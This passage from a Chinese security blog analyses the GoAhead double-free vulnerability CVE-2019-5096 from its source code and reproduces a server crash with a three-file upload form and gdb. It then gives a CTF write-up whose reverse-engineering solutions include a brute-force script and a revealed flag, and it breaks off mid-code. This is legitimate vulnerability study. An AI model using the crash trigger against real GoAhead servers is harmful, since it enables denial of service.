<p>之后来到关键点 2。这里会将之前取出的 currentFile 通过 hashEnter 函数加入一个 hashtable，可以理解为一个链表或者数组。</p>
<p>程序会按照上述流程逐步处理每个数据块。这里我简单画一张图来表示这种处理流程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-2.png"
                     
                ></p>
<p>发现什么问题了嘛？当数据包中只有一个 data 块的时候，这样处理没什么问题，但是当存在两个或者更多数据包的时候，第一次“循环”将 currentFile 指向的内存加入 hashtable，当再次返回 processUploadHeader 函数时，会对上一次处理的那个 currentFile 调用 freeUploadFile ，此时存在于 hashtable 中的内存已经处于 free 状态，为之后的触发埋下伏笔。</p>
<p>还记得之前说的 5 个状态？当一个请求结束的时候会调用 complete 清理环境，源代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">complete</span><span class="params">(Webs *wp, <span class="type">int</span> reuse)</span>    <span class="comment">// 请求处理结束</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(wp);</span><br><span class="line">    assert(websValid(wp));</span><br><span class="line">    assert(wp-&gt;state == WEBS_BEGIN || wp-&gt;state == WEBS_COMPLETE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (reuse &amp;&amp; wp-&gt;flags &amp; WEBS_KEEP_ALIVE &amp;&amp; wp-&gt;rxRemaining == <span class="number">0</span>) &#123; <span class="comment">// 如果存在 keep alive 情况</span></span><br><span class="line">        reuseConn(wp);    <span class="comment">// 重用链接？</span></span><br><span class="line">        socketCreateHandler(wp-&gt;sid, SOCKET_READABLE, socketEvent, wp);</span><br><span class="line">        trace(<span class="number">5</span>, <span class="string">&quot;Keep connection alive&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    trace(<span class="number">5</span>, <span class="string">&quot;Close connection&quot;</span>);</span><br><span class="line">    wp-&gt;state = WEBS_BEGIN;</span><br><span class="line">    wp-&gt;flags |= WEBS_CLOSED;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当请求头包含 Connection: keep-alive 字样的时候，程序尝试重用链接调用 reuseConn 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reuseConn</span><span class="params">(Webs *wp)</span>   <span class="comment">// 重用链接？</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(wp);</span><br><span class="line">    assert(websValid(wp));</span><br><span class="line"></span><br><span class="line">    bufCompact(&amp;wp-&gt;rxbuf);</span><br><span class="line">    <span class="keyword">if</span> (bufLen(&amp;wp-&gt;rxbuf)) &#123;</span><br><span class="line">        socketReservice(wp-&gt;sid);</span><br><span class="line">    &#125;</span><br><span class="line">    termWebs(wp, <span class="number">1</span>);    <span class="comment">// 终止链接？</span></span><br><span class="line">    initWebs(wp, wp-&gt;flags &amp; (WEBS_KEEP_ALIVE | WEBS_SECURE | WEBS_HTTP11), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着调用 termWebs 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">termWebs</span><span class="params">(Webs *wp, <span class="type">int</span> reuse)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(wp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Some of this is done elsewhere, but keep this here for when a shutdown is done and there are open connections.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    bufFree(&amp;wp-&gt;input);</span><br><span class="line">    bufFree(&amp;wp-&gt;output);</span><br><span class="line">    bufFree(&amp;wp-&gt;chunkbuf);</span><br><span class="line">    <span class="keyword">if</span> (!reuse) &#123;</span><br><span class="line">        bufFree(&amp;wp-&gt;rxbuf);</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;sid &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_COM_SSL</span></span><br><span class="line">            sslFree(wp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            socketDeleteHandler(wp-&gt;sid);</span><br><span class="line">            socketCloseConnection(wp-&gt;sid);</span><br><span class="line">            wp-&gt;sid = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !ME_ROM</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;putfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        close(wp-&gt;putfd);</span><br><span class="line">        wp-&gt;putfd = <span class="number">-1</span>;</span><br><span class="line">        assert(wp-&gt;putname &amp;&amp; wp-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span> (rename(wp-&gt;putname, wp-&gt;filename) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            error(<span class="string">&quot;Cannot rename PUT file from %s to %s&quot;</span>, wp-&gt;putname, wp-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_CGI</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;cgifd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        close(wp-&gt;cgifd);</span><br><span class="line">        wp-&gt;cgifd = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wfree(wp-&gt;cgiStdin);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    wfree(wp-&gt;clientFilename);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    websPageClose(wp);</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;timeout &gt;= <span class="number">0</span> &amp;&amp; !reuse) &#123;</span><br><span class="line">        websCancelTimeout(wp);</span><br><span class="line">    &#125;</span><br><span class="line">    wfree(wp-&gt;authDetails);</span><br><span class="line">    wfree(wp-&gt;authResponse);</span><br><span class="line">    wfree(wp-&gt;authType);</span><br><span class="line">    wfree(wp-&gt;contentType);</span><br><span class="line">    wfree(wp-&gt;cookie);</span><br><span class="line">    wfree(wp-&gt;decodedQuery);</span><br><span class="line">    wfree(wp-&gt;digest);</span><br><span class="line">    wfree(wp-&gt;ext);</span><br><span class="line">    wfree(wp-&gt;filename);</span><br><span class="line">    wfree(wp-&gt;host);</span><br><span class="line">    wfree(wp-&gt;method);</span><br><span class="line">    wfree(wp-&gt;password);</span><br><span class="line">    wfree(wp-&gt;path);</span><br><span class="line">    wfree(wp-&gt;protoVersion);</span><br><span class="line">    wfree(wp-&gt;putname);</span><br><span class="line">    wfree(wp-&gt;query);</span><br><span class="line">    wfree(wp-&gt;realm);</span><br><span class="line">    wfree(wp-&gt;referrer);</span><br><span class="line">    wfree(wp-&gt;url);</span><br><span class="line">    wfree(wp-&gt;userAgent);</span><br><span class="line">    wfree(wp-&gt;username);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    wfree(wp-&gt;boundary);</span><br><span class="line">    wfree(wp-&gt;uploadTmp);</span><br><span class="line">    wfree(wp-&gt;uploadVar);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_DIGEST</span></span><br><span class="line">    wfree(wp-&gt;cnonce);</span><br><span class="line">    wfree(wp-&gt;digestUri);</span><br><span class="line">    wfree(wp-&gt;opaque);</span><br><span class="line">    wfree(wp-&gt;nc);</span><br><span class="line">    wfree(wp-&gt;nonce);</span><br><span class="line">    wfree(wp-&gt;qop);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    hashFree(wp-&gt;vars);</span><br><span class="line">    hashFree(wp-&gt;responseCookies);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;files &gt;= <span class="number">0</span>) &#123;    <span class="comment">// 之前处理过的所有文件对象</span></span><br><span class="line">        websFreeUpload(wp);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数执行一系列的内存清理操作，前面的大部分代码没有问题，最后一部分代码出现纰漏</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> ME_GOAHEAD_UPLOAD</span></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;files &gt;= <span class="number">0</span>) &#123;    <span class="comment">// 之前处理过的所有文件对象</span></span><br><span class="line">        websFreeUpload(wp);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>wp-&gt;files 表示 hashtable 中元素的个数，正常上传文件这个字段会大于 0 ，此时调用函数 websFreeUpload，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">void</span> <span class="title function_">websFreeUpload</span><span class="params">(Webs *wp)</span></span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *up;</span><br><span class="line">    WebsKey     *s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;files &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (s = hashFirst(wp-&gt;files); s; s = hashNext(wp-&gt;files, s)) &#123;</span><br><span class="line">            up = s-&gt;content.value.symbol;</span><br><span class="line">            freeUploadFile(up);</span><br><span class="line">            <span class="keyword">if</span> (up == wp-&gt;currentFile) &#123;</span><br><span class="line">                wp-&gt;currentFile = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        hashFree(wp-&gt;files);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;currentFile) &#123;</span><br><span class="line">        freeUploadFile(wp-&gt;currentFile);</span><br><span class="line">        wp-&gt;currentFile = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;upfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        close(wp-&gt;upfd);</span><br><span class="line">        wp-&gt;upfd = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用 hashFirst 函数从 hashTable 中取出元素，并对它调用 freeUploadFile，也就是所谓的存在问题的函数。</p>
<p>到这里漏洞产生的原因已经很明显了，为了更加直观的理解，我修改一下上面的图片：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-3.png"
                     
                ></p>
<p>由于 hashtable 中保存的元素都是处于 free 状态的，所以在 websFreeUpload 函数中再次对它们执行 free 操作就会导致 doble free。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>编译好程序，用命令启动</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo goahead -v --home /etc/goahead /var/www/goahead</span><br></pre></td></tr></table></figure></div>

<p>确认浏览器访问没有问题之后，修改位于 &#x2F;var&#x2F;www&#x2F;goahead 目录下的 index.html 文件内容</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello worlds<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>之后用浏览器访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-4.png"
                     
                ></p>
<p>选择三个文件之后点击 submit</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-5.png"
                     
                ></p>
<p>此时程序已经由于 double free 崩溃。</p>
<p>对此我们可以简单调试分析一下，首先启动 goahead 程序，然后启动 gdb attach 上去，在 websFreeUpload 函数下断点</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b websFreeUpload </span><br></pre></td></tr></table></figure></div>

<p>在浏览器中正常操作，点击 submit 之后 gdb 会断下，单步运行，第一次执行完 hashFirst 取得的元素地址是 0xdeb940，取得的 up 地址为 0xdef300</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-6.png"
                     
                ></p>
<p>再次取得的元素地址依旧是 0xdef300</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-7.png"
                     
                ></p>
<p>继续执行程序崩溃，这里我给出完整的函数崩溃信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-8.png"
                     
                ></p>
<p>可以看到和我们前文的分析相同。</p>
<h2 id="简单的总结"><a href="#简单的总结" class="headerlink" title="简单的总结"></a>简单的总结</h2><p>第一次分析这种开源软件，如果有任何问题还请各位大佬指正。</p>
<p>本文只分析了该漏洞的触发流程以及函数调用流程，至于披露者所称的可造成 RCE 我简单想了一下，感觉可利用空间不是特别大，不过还是看服务运行在哪个系统上面，如果是 2.27 等含有 tcache 的 libc 可能存在利用空间，但是 goahead 主要应用在嵌入式系统中，至于在这些系统能否 RCE 还有待商榷，希望有思路的大佬能交流一番。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>第八届山东省大学生网络安全技能大赛--“深思杯” WP</title>
    <url>/2019/11/04/sdnisc2019/</url>
    <content><![CDATA[<p>又是一年省赛时，今年菜的离谱，把连冠给终结了，CTF 又打不过，离第一名差 20 分，取证又不会，只能靠做做逆向苟命，还是打不过各位带哥。。。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cai.jpg"
                     
                ></p>
<span id="more"></span>

<h2 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h2><p>题目给出了一个 pyc 文件，直接用 uncompyle6 反编译会报错，提示信息：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImportError: Unknown magic number 6432 in flag.pyc</span><br></pre></td></tr></table></figure></div>

<p>很明显告诉我们这个 pyc 文件的 magic num 不正确。有关于 pyc 格式的简单分析可以参考我之前写的<a href="https://wzt.ac.cn/2019/02/13/pyc-simple/">文章</a>。</p>
<p>用 010 打开文件发现头部的 magic num 被替换成了 0x2019，这里直接生成另外一个 pyc 文件，并把文件头的 magic num 抄出来替换进去即可正常反编译。</p>
<p>反编译之后的结果是</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.1</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62171)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.12 (default, Aug 22 2019, 16:36:40) </span></span><br><span class="line"><span class="comment"># [GCC 5.4.0 20160609]</span></span><br><span class="line"><span class="comment"># Embedded file name: flag.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-10-21 14:01:56</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;**********************&#125;&#x27;</span></span><br><span class="line">Sd = []</span><br><span class="line">SdSd = []</span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> flag:</span><br><span class="line">    Sd.append(<span class="built_in">ord</span>(SdSdSdSd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">SdSdSd</span>):</span><br><span class="line">    SdSdSdSdSd = <span class="literal">True</span></span><br><span class="line">    SdSdSdSd = <span class="number">2</span></span><br><span class="line">    sq = <span class="built_in">int</span>(math.sqrt(SdSdSd)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> SdSdSdSd &lt;= sq:</span><br><span class="line">        <span class="keyword">if</span> SdSdSd % SdSdSdSd == <span class="number">0</span>:</span><br><span class="line">            SdSd.append(SdSdSdSd + <span class="number">1</span>)</span><br><span class="line">            SdSdSdSdSd = <span class="literal">False</span></span><br><span class="line">            func(SdSdSd / SdSdSdSd)</span><br><span class="line">            SdSdSdSd += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        SdSdSdSd += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SdSdSdSdSd:</span><br><span class="line">        SdSd.append(SdSdSd + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> Sd:</span><br><span class="line">    func(SdSdSdSd)</span><br><span class="line">    <span class="built_in">print</span> SdSd,</span><br><span class="line">    SdSd = []</span><br><span class="line"><span class="comment"># okay decompiling flag.pyc</span></span><br></pre></td></tr></table></figure></div>

<p>逻辑看似复杂，实际上 func 函数我们根本不需要去分析。这个脚本主要的操作是遍历 flag 字符串的每一个字符，分别执行 func(char) 操作，并且输出得到的结果。</p>
<p>由于题目还给出了正确的加密结果，所以直接爆破就好。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.1</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62171)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.12 (default, Aug 22 2019, 16:36:40) </span></span><br><span class="line"><span class="comment"># [GCC 5.4.0 20160609]</span></span><br><span class="line"><span class="comment"># Embedded file name: flag.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-10-21 14:01:56</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;**********************&#125;&#x27;</span></span><br><span class="line">Sd = []</span><br><span class="line">SdSd = []</span><br><span class="line"><span class="keyword">for</span> SdSdSdSd <span class="keyword">in</span> flag:</span><br><span class="line">    Sd.append(<span class="built_in">ord</span>(SdSdSdSd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">SdSdSd</span>):</span><br><span class="line">    SdSdSdSdSd = <span class="literal">True</span></span><br><span class="line">    SdSdSdSd = <span class="number">2</span></span><br><span class="line">    sq = <span class="built_in">int</span>(math.sqrt(SdSdSd)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> SdSdSdSd &lt;= sq:</span><br><span class="line">        <span class="keyword">if</span> SdSdSd % SdSdSdSd == <span class="number">0</span>:</span><br><span class="line">            SdSd.append(SdSdSdSd + <span class="number">1</span>)</span><br><span class="line">            SdSdSdSdSd = <span class="literal">False</span></span><br><span class="line">            func(SdSdSd / SdSdSdSd)</span><br><span class="line">            SdSdSdSd += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        SdSdSdSd += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SdSdSdSdSd:</span><br><span class="line">        SdSd.append(SdSdSd + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">enc = [[<span class="number">102</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">12</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">18</span>],[<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">18</span>],[<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">18</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">12</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">102</span>],[<span class="number">102</span>],[<span class="number">4</span>,<span class="number">18</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">4</span>,<span class="number">18</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">4</span>,<span class="number">20</span>],[<span class="number">98</span>],[<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">102</span>],[<span class="number">4</span>,<span class="number">18</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">3</span>,<span class="number">14</span>]]</span><br><span class="line"><span class="comment"># for SdSdSdSd in Sd:</span></span><br><span class="line"><span class="comment">#     func(SdSdSdSd)</span></span><br><span class="line"><span class="comment">#     print SdSd,</span></span><br><span class="line"><span class="comment">#     SdSd = []</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIKLMNOPQRSTUWXYZ1234567890&quot;</span></span><br><span class="line"><span class="keyword">for</span> fuck <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment">#print(fuck)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        func(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="comment">#print(SdSd)</span></span><br><span class="line">        <span class="keyword">if</span> SdSd == fuck:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        SdSd = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># okay decompiling flag.pyc</span></span><br></pre></td></tr></table></figure></div>

<p>Flag: flag{eb0cf2f1bfc9990ee3d399a2bbde3dd4}</p>
<h2 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h2><p>今年大家都去 a 杂项、流量分析了，我有幸单刷了两道 RE 题 hh </p>
<p>RE2 是一个 exe 程序，没有加壳，但是程序中有 UPX 段，不过对于分析程序没有影响。</p>
<p>主要代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">int</span> flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// sf</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// of</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+10h] [ebp-D8h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [esp+18h] [ebp-D0h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+19h] [ebp-CFh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+1Ah] [ebp-CEh]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+1Bh] [ebp-CDh]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+1Ch] [ebp-CCh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [esp+1Dh] [ebp-CBh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+1Eh] [ebp-CAh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+1Fh] [ebp-C9h]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [esp+20h] [ebp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+21h] [ebp-C7h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [esp+22h] [ebp-C6h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+23h] [ebp-C5h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+24h] [ebp-C4h]</span></span><br><span class="line">  __int16 v24; <span class="comment">// [esp+48h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [esp+4Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+4Dh] [ebp-9Bh]</span></span><br><span class="line">  __int16 v27; <span class="comment">// [esp+7Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [esp+80h] [ebp-68h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [esp+81h] [ebp-67h]</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [esp+82h] [ebp-66h]</span></span><br><span class="line">  <span class="type">char</span> v31; <span class="comment">// [esp+83h] [ebp-65h]</span></span><br><span class="line">  <span class="type">char</span> v32; <span class="comment">// [esp+B1h] [ebp-37h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp+B4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [esp+B8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v35; <span class="comment">// [esp+E5h] [ebp-3h]</span></span><br><span class="line"></span><br><span class="line">  LOBYTE(v33) = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v33 + <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v29, <span class="number">0</span>, <span 